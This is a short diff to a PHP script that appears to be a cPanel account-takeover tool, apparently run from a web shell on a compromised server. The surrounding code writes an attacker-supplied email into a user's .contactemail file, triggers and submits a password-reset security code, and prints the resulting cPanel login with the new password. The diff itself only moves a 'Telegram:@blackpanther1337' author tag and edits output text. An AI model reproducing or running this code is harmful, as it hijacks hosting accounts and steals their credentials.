@@ -198,8 +198,10 @@ if(isset($g) && $email != ""){
         fwrite(fopen("/home$home$usr/.contactemail","a"),$email);@chmod("/home$home$usr/.contactemail",0600);
         $sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
     }
-echo "\n<br> ./Done";
+echo "\n<br> ./Done>>>>>>>>";
 }
+$txt = "PHP";
+echo "Telegram:@blackpanther1337";
 
 if(isset($g2) && $codeSC != ""){
     $postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
@@ -210,6 +212,5 @@ if(isset($g2) && $codeSC != ""){
     $postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
     echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
 }
-$txt = "PHP";
-echo "Telegram:@blackpanther1337";
+
 ?>
